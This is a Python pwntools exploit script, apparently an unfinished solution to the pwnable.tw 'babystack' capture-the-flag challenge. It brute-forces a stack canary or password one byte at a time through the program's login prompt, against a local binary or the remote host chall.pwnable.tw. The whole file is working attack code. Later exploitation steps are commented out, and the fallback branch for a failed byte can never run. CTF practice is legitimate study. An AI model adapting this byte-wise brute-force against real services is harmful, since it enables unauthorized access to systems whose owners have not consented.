from pwn import *
import pdb


def login(pwd):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Your passowrd :', pwd)
    cont = p.recvline_regex('^Login Success !$', timeout=3)

    return True if cont else False


def logout():
    p.sendlineafter('>> ', '1')


def EXIT():
    p.sendlineafter('>> ', '2')


def read_input(cont):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('Copy :', cont)


def brude(cur=0, _canary=''):
    global count
    flag = True
    for c in range(1, 255):

        print('count: {}'.format(count))
        count += 1
        if c == 10:
            continue
        __canary = _canary + chr(c)
        if login(__canary):
            print('cur: {}, canary:{}'.format(cur, _canary.encode('hex')))
            flag = True
            logout()
            if cur != 15:
                return brude(cur + 1, __canary)
            else:
                return __canary
        elif c == 255:
            return _canary + '\0'


DEBUG = True

context.proxy = (socks.SOCKS5, '192.168.152.1', 18888)
count = 1

if DEBUG:
    _IO_2_1_stdout__offset = 0x01afd60
    p = process('/home/len/pwnable/babystack')
    elf = ELF('/home/len/pwnable/glibcs/glibcs/lib/libc.so.6')
else:
    _IO_2_1_stdout__offset = 0x01bfd60
    p = remote('chall.pwnable.tw', 10204)
    elf = ELF('/home/len/pwnable/libc_64.so.6')

libc = p.libc

if __name__ == '__main__':
    print('libc_base: {:#x}'.format(libc.address))
    pdb.set_trace()
    # login('\0' + 'a' * 0x7d)

    # read_input('b' * 0x3f + '2')

    canary = brude()
    print(canary.encode('hex'))

    p.interactive()